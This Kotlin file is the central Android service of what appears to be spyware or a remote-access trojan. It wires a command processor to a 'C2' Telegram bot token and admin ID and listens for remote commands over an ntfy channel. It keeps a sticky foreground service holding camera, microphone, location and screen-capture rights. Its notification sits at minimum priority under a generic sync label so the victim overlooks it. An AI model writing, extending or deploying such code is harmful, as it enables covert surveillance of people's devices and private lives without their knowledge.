package com.systemlinker.base

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.content.pm.ServiceInfo
import android.os.Build
import android.os.IBinder
import androidx.core.app.NotificationCompat
import com.systemlinker.comm.NtfyConnectionManager
import com.systemlinker.features.CommandProcessor
import kotlinx.coroutines.*

class SystemLinkerService : Service() {

    private val serviceJob = SupervisorJob()
    private val serviceScope = CoroutineScope(Dispatchers.IO + serviceJob)

    private lateinit var configStore: ConfigStore
    private lateinit var ntfyManager: NtfyConnectionManager

    private val fgsStateReceiver = object : BroadcastReceiver() {
        override fun onReceive(context: Context?, intent: Intent?) {
            when (intent?.action) {
                Constants.Intents.ACTION_UPGRADE_FGS_FOR_MEDIA_PROJECTION -> {
                    upgradeToMediaProjectionFGS()
                }
                Constants.Intents.ACTION_DOWNGRADE_FGS_AFTER_MEDIA_PROJECTION -> {
                    downgradeFromMediaProjectionFGS()
                }
            }
        }
    }

    override fun onCreate() {
        super.onCreate()
        ErrorLogger.setupCrashHandler(applicationContext)

        configStore = ConfigStore(this)
        val commandProcessor = CommandProcessor(this, Constants.C2.TELEGRAM_BOT_TOKEN, Constants.C2.TELEGRAM_ADMIN_USER_ID)
        ntfyManager = NtfyConnectionManager(this, configStore, commandProcessor)

        createNotificationChannel()

        val filter = IntentFilter().apply {
            addAction(Constants.Intents.ACTION_UPGRADE_FGS_FOR_MEDIA_PROJECTION)
            addAction(Constants.Intents.ACTION_DOWNGRADE_FGS_AFTER_MEDIA_PROJECTION)
        }
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            registerReceiver(fgsStateReceiver, filter, RECEIVER_NOT_EXPORTED)
        } else {
            registerReceiver(fgsStateReceiver, filter)
        }

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            val initialServiceTypes = ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA or
                                      ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE or
                                      ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION
            startForeground(1001, createNotification(), initialServiceTypes)
        } else {
            startForeground(1001, createNotification())
        }

        serviceScope.launch { ntfyManager.startListening() }
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        WorkManagerSetup.scheduleDailyUpdate(this)
        return START_STICKY
    }

    private fun upgradeToMediaProjectionFGS() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            val notification = createNotification("Live screen streaming active.")
            val serviceTypes = ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA or
                               ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE or
                               ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION or
                               ServiceInfo.FOREGROUND_SERVICE_TYPE_MEDIA_PROJECTION
            startForeground(1001, notification, serviceTypes)
        }
    }

    private fun downgradeFromMediaProjectionFGS() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            val notification = createNotification()
            val serviceTypes = ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA or
                               ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE or
                               ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION
            startForeground(1001, notification, serviceTypes)
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        unregisterReceiver(fgsStateReceiver)
        serviceScope.cancel()
    }

    override fun onBind(intent: Intent?): IBinder? = null

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                Constants.Service.NOTIFICATION_CHANNEL_ID,
                Constants.Service.NOTIFICATION_CHANNEL_NAME,
                NotificationManager.IMPORTANCE_MIN
            ).apply {
                description = "Synchronizes application state"
                setShowBadge(false)
            }
            val manager = getSystemService(NotificationManager::class.java)
            manager?.createNotificationChannel(channel)
        }
    }

    private fun createNotification(text: String = Constants.Service.NOTIFICATION_TEXT): Notification {
        return NotificationCompat.Builder(this, Constants.Service.NOTIFICATION_CHANNEL_ID)
            .setContentTitle(Constants.Service.NOTIFICATION_TITLE)
            .setContentText(text)
            .setSmallIcon(android.R.drawable.ic_popup_sync)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setOngoing(true)
            .build()
    }
}